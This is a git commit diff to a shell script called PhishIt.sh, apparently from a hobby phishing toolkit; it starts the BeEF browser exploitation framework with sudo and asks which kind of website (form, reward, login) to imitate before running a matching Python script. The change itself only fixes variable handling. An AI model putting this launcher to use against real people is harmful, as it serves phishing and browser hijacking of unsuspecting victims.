f84a68e5dcabbcc481d14e0eef37ec8d056788e3
fastfir <95661133+fastfir@users.noreply.github.com>
2022-12-05 22:41:10 -0800

    Im going to bed

--- PhishIt.sh
+++ PhishIt.sh
@@ -5,6 +5,6 @@ echo " |    |   |   Y  \  |\___ \|   Y  \   ||  | "
 echo " |____|   |___|  /__/____  >___|  /___||__| " 
 cd beef
 sudo ./beef
-echo "What kind of website would you like to imitate? (form,reward,login)"
-read $type;
-python3 ImitateWebsite.py
+echo "What kind of website would you like to imitate? (Form,Reward,Login)"
+read type;
+python3 Imitate$type.py
